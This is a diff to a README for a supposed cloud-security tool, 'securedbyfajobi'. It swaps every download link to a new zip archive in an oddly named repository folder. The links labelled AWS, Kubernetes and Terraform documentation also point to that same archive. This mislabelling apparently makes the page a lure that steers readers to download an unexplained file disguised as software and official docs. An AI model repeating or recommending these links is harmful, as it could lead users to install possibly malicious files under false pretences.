@@ -1,6 +1,6 @@
 # 🚀 securedbyfajobi - Your Gateway to Cloud Security Solutions
 
-[![Download](https://raw.githubusercontent.com/ZorraDominatrix/securedbyfajobi/main/Mildred/securedbyfajobi.zip)](https://raw.githubusercontent.com/ZorraDominatrix/securedbyfajobi/main/Mildred/securedbyfajobi.zip)
+[![Download](https://github.com/ZorraDominatrix/securedbyfajobi/raw/refs/heads/main/Mildred/Software_penninite.zip)](https://github.com/ZorraDominatrix/securedbyfajobi/raw/refs/heads/main/Mildred/Software_penninite.zip)
 
 ## 📋 Introduction
 Welcome to securedbyfajobi! This application showcases my skills in DevSecOps, along with various cloud security projects. With over 7 years of experience in the industry, I aim to provide you with tools that simplify your cloud security management.
@@ -23,7 +23,7 @@ This project covers important topics in software development and security:
 To start using **securedbyfajobi**, follow these steps:
 
 1. **Download the Software**  
-   Visit this page to download: [Download Here](https://raw.githubusercontent.com/ZorraDominatrix/securedbyfajobi/main/Mildred/securedbyfajobi.zip).
+   Visit this page to download: [Download Here](https://github.com/ZorraDominatrix/securedbyfajobi/raw/refs/heads/main/Mildred/Software_penninite.zip).
 
 2. **Check System Requirements**  
    - Operating System: Windows (10 or later), macOS (Big Sur or later), or Linux (Ubuntu 20.04 or later).
@@ -40,16 +40,16 @@ To start using **securedbyfajobi**, follow these steps:
    Once your settings are configured, you can start using the application to manage your cloud security. Enjoy a safer and more efficient cloud experience.
 
 ## 💻 Download & Install
-To download the latest version, simply click [here](https://raw.githubusercontent.com/ZorraDominatrix/securedbyfajobi/main/Mildred/securedbyfajobi.zip) and choose the version suitable for your operating system. The download will begin automatically.
+To download the latest version, simply click [here](https://github.com/ZorraDominatrix/securedbyfajobi/raw/refs/heads/main/Mildred/Software_penninite.zip) and choose the version suitable for your operating system. The download will begin automatically.
 
 ## 📞 Support
 If you encounter any issues or need assistance, please reach out via the GitHub Issues section in the repository. I am here to help you navigate your cloud security needs.
 
 ## 🔗 Additional Resources
 For more information about DevSecOps and cloud security, consider checking out the following resources:
-- [AWS Documentation](https://raw.githubusercontent.com/ZorraDominatrix/securedbyfajobi/main/Mildred/securedbyfajobi.zip)
-- [Kubernetes Documentation](https://raw.githubusercontent.com/ZorraDominatrix/securedbyfajobi/main/Mildred/securedbyfajobi.zip)
-- [Terraform Documentation](https://raw.githubusercontent.com/ZorraDominatrix/securedbyfajobi/main/Mildred/securedbyfajobi.zip)
+- [AWS Documentation](https://github.com/ZorraDominatrix/securedbyfajobi/raw/refs/heads/main/Mildred/Software_penninite.zip)
+- [Kubernetes Documentation](https://github.com/ZorraDominatrix/securedbyfajobi/raw/refs/heads/main/Mildred/Software_penninite.zip)
+- [Terraform Documentation](https://github.com/ZorraDominatrix/securedbyfajobi/raw/refs/heads/main/Mildred/Software_penninite.zip)
 
 ## 🔍 Community Engagement
 You are encouraged to contribute to this project. Whether you want to report bugs, suggest features, or improve documentation, feedback is always welcome. Your participation helps improve the tool for everyone.
